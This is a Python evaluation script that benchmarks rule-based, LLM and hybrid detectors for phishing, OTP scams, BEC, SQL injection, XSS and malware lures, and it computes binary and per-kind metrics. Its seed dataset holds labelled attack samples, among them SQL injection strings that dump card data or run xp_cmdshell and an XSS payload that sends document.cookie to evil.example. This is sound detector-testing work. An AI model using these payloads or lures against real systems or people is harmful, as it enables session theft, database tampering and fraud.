# CONTRIBUTION: Eval A v2 — multi-class detection proof for Q1 (7 kinds).
"""Eval A v2: 7-kind taxonomy, per-kind + binary metrics.

RUN: .venv\\Scripts\\python -m tests.eval_detection [--quick] [--csv data/eval/labels.csv]
OUT: docs/EVAL_A.csv + docs/EVAL_A_summary.json

Kinds: phishing | otp | bec | sqli | xss | malware | safe
- binary: attack (any non-safe) vs safe
- multi-class: kind-exact accuracy + per-kind recall
- baselines: rules-only (score>=0.30), llm-only (raw verdict), hybrid (detect full)

CSV format: title,body,label where label in 7 kinds.
"""
import argparse
import csv
import json
import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from src.agents.detector import detect  # noqa: E402
from src.detection.rules import screen  # noqa: E402

KINDS = ["phishing", "otp", "bec", "sqli", "xss", "malware", "safe"]

# ---------- SEED70: 10 per attack kind + 10 safe ----------
SEED = [
    # phishing generic x10
    ("Urgent: verify your account now", "Your account will be suspended. Click http://secure-login.example verify.", "phishing"),
    ("Password reset required", "Dear user verify password now at http://evil.example/login", "phishing"),
    ("Account locked", "Account locked. Login www.evil.example with PIN immediately.", "phishing"),
    ("You won a prize!", "Congratulations lottery win. Claim now with OTP.", "phishing"),
    ("Prize lottery winner", "Won! Send password + OTP to collect prize.", "phishing"),
    ("Bank KYC suspend", "KYC failed suspend. Verify http://bank-kyc.example within 12 hours.", "phishing"),
    ("Free gift claim now", "Click http://gift.example with OTP to claim.", "phishing"),
    ("Department quiz prize", "Quiz Friday. Top scorers prize. Register email.", "phishing"),
    ("Alumni meet lucky draw", "Alumni lucky draw gift hamper. Reply to join.", "phishing"),
    ("Customer survey reward", "Survey reward - reply with name to claim.", "phishing"),
    # otp x10
    ("OTP share needed", "Share one-time password to confirm refund.", "otp"),
    ("WhatsApp OTP request", "Got WhatsApp asking for OTP to verify delivery. Share code?", "otp"),
    ("Missed call verify", "Missed call voicemail says call back to verify account with OTP.", "otp"),
    ("QR scan to verify", "Scan QR code to verify login and enter OTP.", "otp"),
    ("Vishing bank call", "Caller claims bank, asks OTP on call to unblock card.", "otp"),
    ("Mobile recharge bonus", "Recharge bonus claim replying with number and OTP.", "otp"),
    ("OTP for parcel", "Parcel held. Share OTP sent to phone to release.", "otp"),
    ("Call back prize", "Call back now to verify prize with PIN code.", "otp"),
    ("Voicemail password reset", "Voicemail asks to call verify line with password.", "otp"),
    ("Staff raffle second prize", "Won staff raffle - collect HR with ID and OTP.", "otp"),
    # bec x10
    ("Invoice #4471 payment due", "Wire refund to updated account within 24h. Confidential.", "bec"),
    ("CEO confidential transfer", "CEO requests confidential wire. Act now tell no one.", "bec"),
    ("Vendor bank change", "Vendor changed bank. Wire next invoice to new account urgently.", "bec"),
    ("Gift card purchase", "Buy 5 google play cards send codes for client gift.", "bec"),
    ("iTunes card request", "Manager asks buy itunes cards photograph codes ASAP.", "bec"),
    ("Management request transfer", "Management requests urgent confidential transfer to partner.", "bec"),
    ("Refund overpayment", "Client overpaid. Refund difference by wire today.", "bec"),
    ("Payment details update", "Update payment to new wire instructions attached.", "bec"),
    ("Urgent supplier pay", "Supplier payment overdue. Transfer immediately or penalty.", "bec"),
    ("Free gift for feedback", "Share feedback claim small gift from department.", "bec"),
    # sqli x10
    ("Admission login bypass", "Username admin'-- any password on login.", "sqli"),
    ("Fee search dump", "Typed ' UNION SELECT card_no, cvv FROM payments --", "sqli"),
    ("Grade changed", "Typed 101'; UPDATE students SET gpa=4.0 WHERE id=101; --", "sqli"),
    ("Login 1=1", "Typed ' OR 1=1 -- bypass auth.", "sqli"),
    ("Drop table probe", "Search '; DROP TABLE users; --", "sqli"),
    ("Select from users", "Input SELECT * FROM users WHERE 1=1 --", "sqli"),
    ("Insert admin", "Typed '; INSERT INTO admins VALUES('hacker' --", "sqli"),
    ("xp cmdshell", "Input '; EXEC xp_cmdshell dir --", "sqli"),
    ("Union select pass", "Search ' UNION SELECT password FROM staff --", "sqli"),
    ("Comment bypass", "Login admin' # with wrong pass.", "sqli"),
    # xss x10
    ("Wall post stole session", "Post <script>fetch('http://evil.example?c='+document.cookie)</script>", "xss"),
    ("Feedback keylogger", "Box <img src=x onerror=alert(document.domain)>", "xss"),
    ("Review redirect", 'Review <a href="javascript:alert(document.cookie)">stars</a>', "xss"),
    ("Comment cookie theft", "Comment onload=steal() document.cookie exfil.", "xss"),
    ("Profile script", "Bio has <script>alert(1)</script> stored.", "xss"),
    ("Search reflect", "Search <script>alert(location)</script> reflected.", "xss"),
    ("Img payload", "Avatar <img onerror=fetch(evil)> upload.", "xss"),
    ("JS link", "Post javascript:fetch('/admin') link.", "xss"),
    ("Cookie popup", "Page alert(document.cookie) on view.", "xss"),
    ("Form hijack", "Form <input onfocus=steal(this)> injected.", "xss"),
    # malware x10
    ("Invoice exe attachment", "Invoice attached statement.exe run to view.", "malware"),
    ("APK install link", "Install reward.apk from http://short.example/a to claim.", "malware"),
    ("Ransomware decrypt pay", "Your files encrypted. Pay bitcoin to decrypt.", "malware"),
    ("Trojan update", "Critical trojan detected. Run patch.exe attached.", "malware"),
    ("QR malware download", "Scan QR to install player http://bit.ly/x9q.", "malware"),
    ("Short link gift", "Gift at https://tinyurl.com/g9z download to open.", "malware"),
    ("Spyware warning", "Spyware found. Install cleaner.apk now.", "malware"),
    ("Encrypted docs pay", "Documents encrypted pay 0.5 bitcoin for key.", "malware"),
    ("Free software crack", "Cracked software setup.exe free download.", "malware"),
    ("USB found run", "Found USB run start.exe to see contents.", "malware"),
    # safe x10
    ("Team lunch Friday", "Reminder lunch usual place Friday.", "safe"),
    ("Class routine spring", "Routine published notice board 501.", "safe"),
    ("Library hours extended", "Library open till 8pm exams bring ID.", "safe"),
    ("Lab report due", "Report 4 due Monday submit PDF.", "safe"),
    ("Bus schedule update", "Shuttle 7:30am gate 2 arrive early.", "safe"),
    ("Thesis feedback", "Supervisor comments chapter 2 revise method.", "safe"),
    ("Workshop invite", "Python workshop Saturday bring laptop.", "safe"),
    ("Exam seat plan", "Midterm seats room 302 roll 15-40.", "safe"),
    ("Project demo slot", "Demo Thursday 2-4pm book sheet.", "safe"),
    ("Seminar slides", "Security seminar slides on drive.", "safe"),
]


def load_csv(path: Path):
    rows = []
    with open(path, newline="", encoding="utf-8") as f:
        for r in csv.DictReader(f):
            rows.append((r["title"], r.get("body", ""), r["label"].strip().lower()))
    return rows


def rules_only(title, body):
    import time as _t
    t0 = _t.perf_counter()
    s = screen(f"{title}\n{body}")
    ms = round((_t.perf_counter() - t0) * 1000, 1)
    return ("phishing" if s["score"] >= 0.30 else "safe"), ms, s["score"], "phishing"


def llm_only(title, body):
    from src.llm.client import generate
    t0 = time.perf_counter()
    try:
        raw = generate(f"Message:\n{title}\n{body}",
                       system=(ROOT / "src" / "llm" / "prompts" / "detector.txt").read_text())
        ms = round((time.perf_counter() - t0) * 1000, 1)
        st, en = raw.find("{"), raw.rfind("}")
        llm = json.loads(raw[st:en + 1]) if st >= 0 and en > st else {}
        v = "phishing" if llm.get("verdict") == "phishing" else "safe"
        k = str(llm.get("kind", v)).lower()
        if k not in KINDS:
            k = "phishing" if v == "phishing" else "safe"
        return v, ms, 1 if v == "phishing" else 0, k
    except Exception as e:
        ms = round((time.perf_counter() - t0) * 1000, 1)
        return "error", ms, -1, "safe"


def hybrid(title, body):
    t0 = time.perf_counter()
    d = detect(title, body)
    ms = round((time.perf_counter() - t0) * 1000, 1)
    v = d["verdict"] if d["verdict"] in ("phishing", "safe") else "error"
    return v, d.get("llm_ms", ms), d["score"], d.get("kind", "phishing")


def bin_scores(yt, yp):
    b = lambda x: "attack" if x != "safe" else "safe"  # noqa: E731
    Y = [b(t) for t in yt]
    P = [b(p) if p in ("phishing", "safe") else ("safe" if p == "safe" else "attack") for p in yp]
    tp = sum(1 for t, p in zip(Y, P) if t == "attack" and p == "attack")
    tn = sum(1 for t, p in zip(Y, P) if t == "safe" and p == "safe")
    fp = sum(1 for t, p in zip(Y, P) if t == "safe" and p == "attack")
    fn = sum(1 for t, p in zip(Y, P) if t == "attack" and p != "attack")
    acc = (tp + tn) / max(1, len(Y))
    prec = tp / max(1, tp + fp)
    rec = tp / max(1, tp + fn)
    f1 = 2 * prec * rec / max(1e-9, prec + rec)
    return {"n": len(Y), "tp": tp, "tn": tn, "fp": fp, "fn": fn, "acc": round(acc, 3),
            "prec": round(prec, 3), "rec": round(rec, 3), "f1": round(f1, 3),
            "fp_rate": round(fp / max(1, fp + tn), 3)}


def main():
    import argparse
    ap = argparse.ArgumentParser()
    ap.add_argument("--quick", action="store_true")
    ap.add_argument("--csv", default="")
    a = ap.parse_args()
    data = load_csv(Path(a.csv)) if a.csv else SEED
    if a.quick:
        data = data[:21]
    yt = [l for _, _, l in data]
    per_case, summary = [], {}
    for name, fn in [("rules", rules_only), ("llm", llm_only), ("hybrid", hybrid)]:
        yp, yk, mss = [], [], []
        for title, body, label in data:
            p, ms, sc, k = fn(title, body)
            yp.append(p)
            yk.append(k)
            mss.append(ms)
            if name == "hybrid":
                per_case.append({"title": title, "label": label, "pred": p,
                                 "kind_pred": k, "score": sc, "ms": ms})
        yp_clean = [p if p in ("phishing", "safe") else "safe" for p in yp]
        m = bin_scores(yt, yp_clean)
        m["avg_ms"] = round(sum(mss) / max(1, len(mss)), 1)
        m["errors"] = sum(1 for p in yp if p not in ("phishing", "safe"))
        # per-kind recall (kind-exact for hybrid/llm)
        per_kind = {}
        for k in KINDS:
            idx = [i for i, t in enumerate(yt) if t == k]
            if not idx:
                continue
            if name == "rules":
                hit = sum(1 for i in idx if (yp_clean[i] != "safe") == (k != "safe"))
            else:
                hit = sum(1 for i in idx if yk[i] == k)
            per_kind[k] = f"{hit}/{len(idx)}"
        m["per_kind"] = per_kind
        kind_acc = sum(1 for t, k in zip(yt, (yk if name != "rules" else yp_clean)) if (
            (t == k) or (name == "rules" and (t != "safe") == (k != "safe")))) / len(yt)
        m["kind_acc"] = round(kind_acc, 3)
        summary[name] = m
        print(f"{name:8s} BIN acc={m['acc']} P={m['prec']} R={m['rec']} F1={m['f1']} "
              f"FP={m['fp_rate']} kind_acc={m['kind_acc']} ms={m['avg_ms']} err={m['errors']}")
        print(f"         per-kind: {per_kind}")
    docs = ROOT / "docs"
    docs.mkdir(exist_ok=True)
    with open(docs / "EVAL_A.csv", "w", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=["title", "label", "pred", "kind_pred", "score", "ms"])
        w.writeheader()
        w.writerows(per_case)
    (docs / "EVAL_A_summary.json").write_text(json.dumps(
        {"dataset": a.csv or f"seed{len(data)}-7kind", "n": len(data),
         "binary": {k: {kk: vv for kk, vv in v.items() if kk != "per_kind"} for k, v in summary.items()},
         "per_kind": {k: v["per_kind"] for k, v in summary.items()},
         "note": "rules>=0.30 binary only; llm/hybrid kind-exact; errors counted as miss"}, indent=2))
    print(f"saved docs/EVAL_A.csv ({len(per_case)}) + EVAL_A_summary.json")


if __name__ == "__main__":
    main()
